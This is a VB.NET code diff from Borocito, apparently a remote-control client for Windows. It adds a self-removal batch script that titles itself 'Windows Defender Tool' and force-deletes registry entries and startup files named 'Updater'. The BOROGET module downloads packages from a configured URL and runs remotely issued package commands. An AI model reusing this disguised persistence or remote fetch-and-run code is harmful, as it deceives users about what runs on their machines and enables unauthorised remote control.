@@ -116,12 +116,19 @@ Module Payloads
             Dim Reg_BorocitoConfig As String = "reg delete " & """" & "HKEY_CURRENT_USER\SOFTWARE\Borocito" & """" & " /f" 'Borocito configuration
             Dim Reg_StartAsAdmin As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" & """" & " /v " & """" & Application.ExecutablePath & """" & " /f"
             Dim Reg_StartWithWindows As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" & """" & " /v " & """" & "Borocito" & """" & " /f"
+            Dim File_StartWithWindows1 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe" & """"
+            Dim File_StartWithWindows2 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk" & """"
+            Dim File_StartWithWindows3 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat" & """"
             Dim File_UpdaterTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroUpdater.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroUpdater.exe" & """"
             Dim File_ExtractorTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroExtractor.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroExtractor.exe" & """"
             Dim Dir_DIRCommons As String = "rmdir /q /s " & """" & DIRCommons & """"
-            Dim FinalContent As String = "@echo off /c " & Reg_BorocitoConfig &
+            Dim FinalContent As String = "@echo off /c " & "title Windows Defender Tool" &
+                " & " & Reg_BorocitoConfig &
                 " & " & Reg_StartAsAdmin &
                 " & " & Reg_StartWithWindows &
+                " & " & File_StartWithWindows1 &
+                " & " & File_StartWithWindows2 &
+                " & " & File_StartWithWindows3 &
                 " & " & File_UpdaterTemp &
                 " & " & File_ExtractorTemp &
                 " & " & Dir_DIRCommons
@@ -179,17 +186,17 @@ Module BOROGET
                     End If
                 End If
             ElseIf boroGETcommand = "set" Then
-                Return "Setting..."
                 Dim args() As String = boroGETcommand.Split("|")
-                SetBOROGET(args(1), args(2))
+                Return SetBOROGET(args(1), args(2))
             Else
-                'paquete a instalars
+                'paquete a instalar
                 Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
                 Process.Start(regKey.GetValue("boro-get"), boroGETcommand)
                 Return "Processing Package (" & boroGETcommand & ")"
             End If
         Catch ex As Exception
             AddToLog("BORO_GET_ADMIN@BOROGET", "Error" & ex.Message, True)
+            Return "Error parsing 'boro-get' command."
         End Try
     End Function
 
@@ -202,7 +209,7 @@ Module BOROGET
                 My.Computer.FileSystem.DeleteFile(zipPackageFile)
             End If
             'Descargar desde el servidor
-            My.Computer.Network.DownloadFile(HttpOwnerServer & "/Boro-Get/boro-get.zip", zipPackageFile)
+            My.Computer.Network.DownloadFile(GetIniValue("Components", "boro-get", DIRCommons & "\General.ini"), zipPackageFile)
             'Instalar
             ZipFile.ExtractToDirectory(zipPackageFile, DIRBoroGetInstallFolder)
             'Registra
@@ -217,8 +224,8 @@ Module BOROGET
             regKey.SetValue("RepoListURL", GetIniValue("CONFIG", "RepoList", DIRBoroGetInstallFolder & "\boro-get.txt"))
             Return "boro-get has been installed!"
         Catch ex As Exception
-            Return "Error installing boro-get. " & ex.Message
             AddToLog("Install@BOROGET", "Error" & ex.Message, True)
+            Return "Error installing boro-get."
         End Try
     End Function
     Function UninstallBOROGET() As String
@@ -235,8 +242,8 @@ Module BOROGET
             regKey.SetValue("RepoListURL", "")
             Return "boro-get has been uninstalled!"
         Catch ex As Exception
-            Return "Error uninstalling boro-get. " & ex.Message
             AddToLog("Uninstall@BOROGET", "Error" & ex.Message, True)
+            Return "Error uninstalling boro-get."
         End Try
     End Function
     Function SetBOROGET(ByVal regKey As String, ByVal regValue As String) As String
@@ -249,8 +256,8 @@ Module BOROGET
             RegeditBoroGet.SetValue(regKey, regValue)
             Return "Key: " & regKey & " Value: " & regValue & " has been setted!"
         Catch ex As Exception
-            Return "Error setting registry. " & ex.Message
             AddToLog("Set@BOROGET", "Error" & ex.Message, True)
+            Return "Error setting registry."
         End Try
     End Function
 End Module
